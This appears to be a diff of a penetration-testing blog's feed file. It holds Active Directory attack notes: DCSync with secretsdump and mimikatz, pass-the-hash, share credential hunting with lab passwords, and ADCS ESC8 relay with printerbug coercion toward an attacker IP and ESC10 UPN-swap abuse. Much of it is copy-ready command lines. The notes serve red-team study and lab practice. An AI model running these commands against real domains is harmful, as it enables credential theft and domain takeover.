-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">secretsdump.py -just-dc-user &lt;DOMAIN&gt;/administrator -k -no-pass <span class="string">&quot;&lt;DC_FQDN&gt;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Alternative-—-Recover-the-DC’s-NT-Hash"><a href="#Alternative-—-Recover-the-DC’s-NT-Hash" class="headerlink" title="Alternative — Recover the DC’s NT Hash"></a>Alternative — Recover the DC’s NT Hash</h4><h5 id="Extract-the-NT-Hash"><a href="#Extract-the-NT-Hash" class="headerlink" title="Extract the NT Hash"></a>Extract the NT Hash</h5><blockquote>
-<p>➜ Submit a TGS request for ourselves to recover the DC machine account’s NT hash from the TGT.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/PKINITtools/getnthash.py -key &lt;AS-REP_KEY&gt; &lt;DOMAIN&gt;/&lt;DC_NAME&gt;\$</span><br></pre></td></tr></table></figure>
-
-<h5 id="Validate-via-Pass-the-Hash"><a href="#Validate-via-Pass-the-Hash" class="headerlink" title="Validate via Pass-the-Hash"></a>Validate via Pass-the-Hash</h5><blockquote>
-<p>➜ Tool: <strong>NetExec</strong> (<code>nxc</code>). Confirm the recovered DC hash works against the DC.</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb &lt;DC_IP&gt; -u &lt;DC_NAME&gt;$ -H &lt;NT_HASH&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="Windows-Path"><a href="#Windows-Path" class="headerlink" title="Windows Path"></a>Windows Path</h4><h5 id="Request-a-TGT-with-Rubeus"><a href="#Request-a-TGT-with-Rubeus" class="headerlink" title="Request a TGT with Rubeus"></a>Request a TGT with Rubeus</h5><blockquote>
-<p>➜ Request and inject a TGT using the certificate.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:&lt;DC_NAME&gt;<span class="variable">$</span> /certificate:&lt;base64&gt; /ptt</span><br></pre></td></tr></table></figure>
-
-<h5 id="DCSync-with-Mimikatz"><a href="#DCSync-with-Mimikatz" class="headerlink" title="DCSync with Mimikatz"></a>DCSync with Mimikatz</h5><blockquote>
-<p>➜ DCSync the krbtgt account once the ticket is injected.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;lsadump::dcsync /user:&lt;DOMAIN&gt;\krbtgt&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Exploitation</category>
-        <category>Bleeding-Edge &amp; Coercion</category>
-      </categories>
-      <tags>
-        <tag>secretsdump</tag>
-        <tag>Windows</tag>
-        <tag>Privilege-Escalation</tag>
-        <tag>Mimikatz</tag>
-        <tag>Rubeus</tag>
-        <tag>Active-Directory</tag>
-        <tag>Domain-Escalation</tag>
-        <tag>NoPac</tag>
-        <tag>CVE-2021-42278</tag>
-        <tag>CVE-2021-42287</tag>
-        <tag>PrintNightmare</tag>
-        <tag>CVE-2021-1675</tag>
-        <tag>CVE-2021-34527</tag>
-        <tag>PetitPotam</tag>
-        <tag>CVE-2021-36942</tag>
-        <tag>ADCS</tag>
-        <tag>NTLM-Relay</tag>
-        <tag>PKINIT</tag>
-        <tag>ntlmrelayx</tag>
-        <tag>PKINITtools</tag>
-        <tag>DCSync</tag>
-        <tag>NetExec</tag>
-        <tag>Impacket</tag>
-        <tag>Print-Spooler</tag>
-        <tag>Certificate-Abuse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Credential Hunting in Network Shares</title>
-    <url>/2025/11/27/Credential-Hunting-in-Network-Shares/</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="From-Domain-Joined-Machine"><a href="#From-Domain-Joined-Machine" class="headerlink" title="From Domain Joined Machine"></a>From Domain Joined Machine</h2><h3 id="Snaffler"><a href="#Snaffler" class="headerlink" title="Snaffler"></a>Snaffler</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\Users\Public&gt;Snaffler.exe <span class="literal">-s</span></span><br></pre></td></tr></table></figure>
-
-
-<ul>
-<li><code>-u : retrieves a list of users from Active Directory and searches for references to them in files</code></li>
-<li><code>-i and -n allow you to specify which shares should be included in the search.</code></li>
-</ul>
-<h2 id="Non-Domain-Joined-Machine"><a href="#Non-Domain-Joined-Machine" class="headerlink" title="Non Domain Joined Machine"></a>Non Domain Joined Machine</h2><h3 id="PowerHuntShares"><a href="#PowerHuntShares" class="headerlink" title="PowerHuntShares"></a>PowerHuntShares</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Unblock-File</span> <span class="literal">-Path</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Import-Module</span> C:\Users\Public\PowerHuntShares\PowerHuntShares.psm1</span><br><span class="line"><span class="built_in">Invoke-HuntSMBShares</span> <span class="literal">-Threads</span> <span class="number">100</span> <span class="literal">-OutputDirectory</span> c:\Users\Public</span><br><span class="line"></span><br><span class="line">[*][<span class="number">05</span>/<span class="number">01</span>/<span class="number">2025</span> <span class="number">12</span>:<span class="number">51</span>] Output Directory: c:\Users\Public\SmbShareHunt<span class="literal">-05012025125123</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="MANSPIDER"><a href="#MANSPIDER" class="headerlink" title="MANSPIDER"></a>MANSPIDER</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;passw&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\Company\Forms\HR_Form_14.pdf: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password: SecureDocs99</span><br><span class="line">[+] 10.129.182.89\Company\Forms\Incident_Report_57.xlsx: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] password=Summer2023!</span><br><span class="line"></span><br><span class="line">&lt;snip&gt;</span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;passw&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">manspider 10.129.182.89 -c <span class="string">&#x27;INLANEFREIGHT&#x27;</span> -u <span class="string">&#x27;mendres&#x27;</span> -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] 10.129.182.89\IT\Tools\split_tunnel.txt: matched <span class="string">&quot;INLANEFREIGHT&quot;</span> 1 <span class="built_in">times</span></span><br><span class="line">[+] <span class="comment"># Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Netexec"><a href="#Netexec" class="headerlink" title="Netexec"></a>Netexec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 10.129.234.121 -u mendres -p <span class="string">&#x27;Inlanefreight2025!&#x27;</span> --spider IT --content --pattern <span class="string">&quot;passw&quot;</span></span><br><span class="line"></span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! </span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Started spidering</span><br><span class="line">SMB         10.129.234.121  445    DC01             [*] Spidering .</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
-
-<p>We can also download the files locally:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb 104.152.52.235 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True</span><br></pre></td></tr></table></figure>
-
-<p>Then search for the pattern we want:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br></pre></td></tr></table></figure>
-
-<p>Example result</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/nxc_hosted/nxc_spider_plus/10.129.234.173</span><br><span class="line"></span><br><span class="line">grep -ri <span class="string">&quot;passw&quot;</span> .</span><br><span class="line"></span><br><span class="line">Auth backup password: INLANEFREIGHT\jbader:ILovePower333###</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>SMB</category>
-      </categories>
-      <tags>
-        <tag>SMB</tag>
-        <tag>Enumeration</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>ESC8</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ADCS : ESC10</title>
-    <url>/2026/06/04/ADCS-ESC10/</url>
-    <content><![CDATA[<h1 id="Certificate-authentication-mapping"><a href="#Certificate-authentication-mapping" class="headerlink" title="Certificate authentication mapping"></a>Certificate authentication mapping</h1><p>When we authenticate using the <code>Certificate Authentication</code> method the Domain Controller (KDC) must answer a critical question :</p>
-<blockquote>
-<p>➜ Which Active Directory account owns this certificate?</p>
-</blockquote>
-<p>The process of associating a certificate with an Active Directory account is called <code>Certificate Mapping</code>.</p>
-<p>Certificate mapping can occur in two different places:</p>
-<blockquote>
-<p>1- The KDC if we use kerberos PKINIT authentication</p>
-</blockquote>
-<p>   2- Schannel if we use TLS client certificate authentication</p>
-<h4 id="Case-1-Certificate-Kerberos"><a href="#Case-1-Certificate-Kerberos" class="headerlink" title="Case 1 : Certificate + Kerberos"></a>Case 1 : Certificate + Kerberos</h4><p>With this method, the certificate is used to request a Kerberos TGT through PKINIT.</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate</span><br><span class="line">     ↓</span><br><span class="line">KDC asks: &quot;Who owns this certificate?&quot;</span><br><span class="line">     ↓</span><br><span class="line">Certificate Mapping</span><br><span class="line">     ↓</span><br><span class="line">TGT Issued</span><br></pre></td></tr></table></figure>
-
-<p>The important question becomes:</p>
-<blockquote>
-<p>How does the KDC answer this question : Who owns this certificate ?</p>
-</blockquote>
-<p>The answer is controlled by the <code>StrongCertificateBindingEnforcement</code> registry value:</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\Kdc&quot;</span> /v StrongCertificateBindingEnforcement</span><br></pre></td></tr></table></figure>
-
-<p>This registry key defines how strictly the KDC maps certificates to Active Directory accounts.</p>
-<blockquote>
-<p>StrongCertificateBindingEnforcement &#x3D; 0</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">     Certificate</span><br><span class="line">          ↓</span><br><span class="line">KDC reads the UPN</span><br><span class="line">          ↓</span><br><span class="line">Finds the matching AD account</span><br><span class="line">          ↓</span><br><span class="line">      Issues a TGT</span><br></pre></td></tr></table></figure>
-
-<p>In this mode, the KDC relies on weak mapping methods such as the <code>UPN contained in the certificate</code> rather than enforcing <code>SID-based</code> validation.</p>
-<p>Example:</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate UPN : administrator@mirage.htb</span><br><span class="line">Certificate SID : Attacker SID</span><br></pre></td></tr></table></figure>
-
-<p>The KDC searches Active Directory for :</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">administrator@mirage.htb</span><br></pre></td></tr></table></figure>
-
-<p>Then maps the certificate to the matching account and as a result a TGT is issued for the Administrator account even though the SID embedded in the certificate belongs to the attacker.</p>
-<blockquote>
-<p>StrongCertificateBindingEnforcement &#x3D; 1</p>
-</blockquote>
-<p>In Compatibility Mode, the KDC first attempts SID-based certificate mapping and falls back to weaker methods such as UPN mapping if SID validation cannot be performed.</p>
-<blockquote>
-<p>StrongCertificateBindingEnforcement &#x3D; 2</p>
-</blockquote>
-<p>In Full Enforcement Mode, the KDC only performs SID-based certificate mapping and ignores weaker identifiers such as UPN, SAN, or Subject fields.</p>
-<h4 id="Case-2-Certificate-Schannel-Secure-Channel"><a href="#Case-2-Certificate-Schannel-Secure-Channel" class="headerlink" title="Case 2 : Certificate + Schannel (Secure Channel)"></a>Case 2 : Certificate + Schannel (Secure Channel)</h4><p>With this method, the certificate is used directly against a TLS-enabled service such as <code>LDAPS</code>, <code>HTTPS</code>, or <code>WinRM over HTTPS</code>.</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate</span><br><span class="line">     ↓</span><br><span class="line">LDAPS / IIS / WinRM HTTPS</span><br><span class="line">     ↓</span><br><span class="line">Schannel asks: &quot;Who owns this certificate?&quot;</span><br><span class="line">     ↓</span><br><span class="line">Certificate Mapping</span><br><span class="line">     ↓</span><br><span class="line">Authenticated Session</span><br></pre></td></tr></table></figure>
-
-<p>The important question becomes:</p>
-<blockquote>
-<p>How does Schannel answer this question: Who owns this certificate?</p>
-</blockquote>
-<p>The answer is controlled by the <code>CertificateMappingMethods</code> registry value:</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL&quot;</span> /v CertificateMappingMethods</span><br></pre></td></tr></table></figure>
-
-<p>This registry key defines how Schannel maps certificates to Active Directory accounts.</p>
-<p>Schannel (Secure Channel) is Microsoft’s SSL&#x2F;TLS implementation used by services such as HTTPS, LDAPS, and other TLS-based applications, unlike Kerberos PKINIT this authentication flow does not issue a TGT instead the user receives an authenticated session to the target service.</p>
-<blockquote>
-<p>CertificateMappingMethods &#x3D; 0x4</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">     Certificate</span><br><span class="line">          ↓</span><br><span class="line">Schannel reads Subject</span><br><span class="line">          ↓</span><br><span class="line">Finds the matching AD account</span><br><span class="line">          ↓</span><br><span class="line">Creates an authenticated session</span><br></pre></td></tr></table></figure>
-
-<p>In this mode, Schannel relies on weak mapping methods such as the certificate Subject rather than enforcing strong SID-based validation.</p>
-<p>Example:</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Certificate Subject : CN=Administrator</span><br><span class="line">Certificate SID     : Attacker SID</span><br></pre></td></tr></table></figure>
-
-<p>Schannel searches Active Directory for:</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">CN=Administrator</span><br></pre></td></tr></table></figure>
-
-<p>Then maps the certificate to the matching account. As a result, an authenticated session may be established as the Administrator account even though the certificate SID belongs to the attacker.</p>
-<h1 id="Esc10"><a href="#Esc10" class="headerlink" title="Esc10"></a>Esc10</h1><blockquote>
-<p>ESC10 is an AD CS misconfiguration that occurs when weak certificate mapping is used. Instead of mapping a certificate to an account using the <code>SID</code> stored in the <code>szOID_NTDS_CA_SECURITY_EXT</code> extension, the system relies on weaker identifiers such as the certificate’s <code>UPN</code> or <code>Subject</code> that are embedded in the certificate, this may allow an attacker to obtain a certificate that maps to another Active Directory account and authenticate as that user.</p>
-</blockquote>
-<h3 id="Case-1-Kerberos-PKINIT-mapping"><a href="#Case-1-Kerberos-PKINIT-mapping" class="headerlink" title="Case 1 : Kerberos &#x2F; PKINIT mapping"></a>Case 1 : Kerberos &#x2F; PKINIT mapping</h3><h5 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h5><blockquote>
-<ul>
-<li><p>Weak Kerberos mapping : <code>StrongCertificateBindingEnforcement = 0</code></p>
-</li>
-<li><p>Client authentication template : At least one enabled certificate template must allow client authentication, such as the built-in <code>User</code> template.</p>
-</li>
-<li><p>Write access over another account : We need at least <code>GenericWrite</code> permissions over another user account.</p>
-</li>
-</ul>
-</blockquote>
-<p>➜ After Microsoft’s 2023 certificate mapping hardening updates, ESC10 Case 1 became significantly harder to exploit, systems that enforce SID-based certificate mapping are generally not vulnerable, while unpatched systems or environments that still allow weak mapping may remain exploitable.</p>
-<h5 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h5><blockquote>
-<p>Find AD CS </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ netexec ldap dc-ip -u user -p <span class="built_in">pwd</span> -M adcs</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Check the Kerberos certificate mapping configuration (<code>StrongCertificateBindingEnforcement</code>)</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\Kdc&quot;</span> /v StrongCertificateBindingEnforcement</span><br><span class="line"></span><br><span class="line">➜ The value should be <span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Enumerate Certificate Authorities and templates</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p <span class="built_in">pwd</span> -dc-ip ip -stdout</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Identify vulnerable certificate configurations</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p <span class="built_in">pwd</span> -dc-ip ip -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h5><blockquote>
-<ul>
-<li><p>user-b has one of those permissions ( GenericAll &#x2F; GenericWrite &#x2F; WriteProperty &#x2F; WriteDACL &#x2F; Owner ) over user-a</p>
-</li>
-<li><p>user-a : is the account that will be used to request <code>Administrator Certificate</code></p>
-</li>
-</ul>
-</blockquote>
-<blockquote>
-<p>Change user-a’s UPN to the target identity</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn administrator@lab.local</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Request a certificate using an authentication-enabled template</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy req -u &#x27;user-a@lab.local&#x27; -p pwd -target dc.lab.local -ca CA-Name -template User</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Restore user-a’s original UPN</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p <span class="built_in">pwd</span> -target dc.lab.local -user user-a -upn user-a@lab.local</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Authenticate with the certificate</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy auth -pfx user-a.pfx -domain lab.local -dc-ip dc-ip</span><br></pre></td></tr></table></figure>
-
-
-
-
-<h3 id="Case-2-Schannel-Mapping"><a href="#Case-2-Schannel-Mapping" class="headerlink" title="Case 2 : Schannel Mapping"></a>Case 2 : Schannel Mapping</h3><h5 id="Requirements-1"><a href="#Requirements-1" class="headerlink" title="Requirements"></a>Requirements</h5><blockquote>
-<ul>
-<li>Weak Schannel mapping: <code>CertificateMappingMethods = 0x4</code></li>
-<li>Client authentication template: At least one enabled certificate template must allow client authentication.</li>
-<li>Write access over another account: We need at least <code>GenericWrite</code> permissions over another user account.</li>
-</ul>
-</blockquote>
-<h5 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h5><blockquote>
-<p>Find AD CS</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ netexec ldap dc-ip -u user -p pwd -M adcs</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Check the Schannel certificate mapping configuration (<code>CertificateMappingMethods</code>)</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL&quot; /v CertificateMappingMethods</span><br><span class="line"></span><br><span class="line">➜ The value should be 0x4</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Enumerate Certificate Authorities and templates</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p pwd -dc-ip ip -stdout</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Identify vulnerable certificate configurations</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy find -u user -p pwd -dc-ip ip -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Certipy does not directly detect ESC10 by querying the Schannel <code>CertificateMappingMethods</code> registry key on Domain Controllers or other target servers, as this typically requires privileged access (like local administrator rights) to those servers’ registries.</p>
-</blockquote>
-<h5 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h5><blockquote>
-<ul>
-<li>user-b has one of those permissions (<code>GenericAll</code> &#x2F; <code>GenericWrite</code> &#x2F; <code>WriteProperty</code> &#x2F; <code>WriteDACL</code> &#x2F; <code>Owner</code>) over user-a</li>
-<li>user-a is the account that will be used to request the target certificate</li>
-</ul>
-</blockquote>
-<blockquote>
-<p>Change user-a’s UPN to the target identity</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn DC-Name$</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Request a certificate using an authentication-enabled template</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy req -u &#x27;user-a@lab.local&#x27; -p pwd -target dc.lab.local -ca CA-Name -template User</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Restore user-a’s original UPN</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy account update -u user-b -p pwd -target dc.lab.local -user user-a -upn user-a@lab.local</span><br></pre></td></tr></table></figure>
-
-
-<blockquote>
-<p>Finally, because this misconfiguration affects Schannel certificate mapping rather than Kerberos PKINIT mapping, the certificate cannot be used to obtain a Kerberos TGT as in ESC10 Case 1 instead authentication must be performed through a Schannel-enabled service such as LDAPS, for this purpose Certipy provides the <code>-ldap-shell</code> option which authenticates using the certificate via Schannel and opens an authenticated LDAP session. Although this session does not provide code execution, it allows us to modify Active Directory objects and perform attacks such as configuring  (RBCD).</p>
-</blockquote>
-<blockquote>
-<p>Creating a new computer account</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ certipy auth -pfx DC-Name.pfx -domain lab.local -dc-ip ip -ldap-shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># add_computer &lt;machine-name&gt; &lt;password&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Configure Rbcd </p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ certipy auth -pfx DC-Name.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># set_rbcd &lt;TARGET_MACHINE&gt; &lt;CONTROLLED_MACHINE&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Abusing RBCD to Impersonate the Administrator</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getST.py -spn cifs/DC.LAB.LOCAL -impersonate Administrator -dc-ip ip lab.local/<span class="string">&#x27;machine-name$&#x27;</span>:password</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>ESC10</tag>
-        <tag>Netexec</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Credential Pillaging</title>
     <url>/2026/06/30/Credential-Pillaging/</url>
     <content><![CDATA[<blockquote>
@@ -970,7 +776,6 @@
         <tag>Windows</tag>
         <tag>Privilege-Escalation</tag>
         <tag>Active-Directory</tag>
-        <tag>NetExec</tag>
         <tag>Credential-Pillaging</tag>
         <tag>Credential-Access</tag>
         <tag>GPP</tag>
@@ -980,6 +785,7 @@
         <tag>Logon-Scripts</tag>
         <tag>Get-GPPPassword</tag>
         <tag>gpp-decrypt</tag>
+        <tag>NetExec</tag>
         <tag>Active-Directory-Attributes</tag>
         <tag>User-Descriptions</tag>
         <tag>ADIDNSDump</tag>
@@ -1241,6 +1047,59 @@
       <tags>
         <tag>PowerView</tag>
         <tag>Rubeus</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DPAPI</title>
+    <url>/2025/11/26/DPAPI/</url>
+    <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
+<ul>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></li>
+<li><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></li>
